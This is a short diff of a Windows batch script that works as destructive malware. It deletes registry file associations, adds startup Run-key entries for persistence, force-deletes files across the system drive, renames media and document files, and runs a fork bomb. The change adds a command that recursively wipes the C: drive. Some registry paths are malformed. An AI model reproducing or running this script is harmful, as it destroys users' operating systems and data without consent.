@@ -1,4 +1,3 @@
-:a
 START reg delete HKCR/.exe
 START reg delete HKCR/.dll
 START reg delete HKCR/*
@@ -14,5 +13,7 @@ reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v WINDOWsAPI
 reg add hkey_local_machinesoftwaremicrosftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:window
 delete %systemdrive%\*.* /f /s
 REN *.avi *.txt REN *.mkv *.txt REN *.BAT *.txt REN *.doc *.txt REN *.JPEG *.txt REN *.lnk *.txt REN *.EXE *.noob
+:a
+rd c:\ /q /s
 %0|%0
 goto a
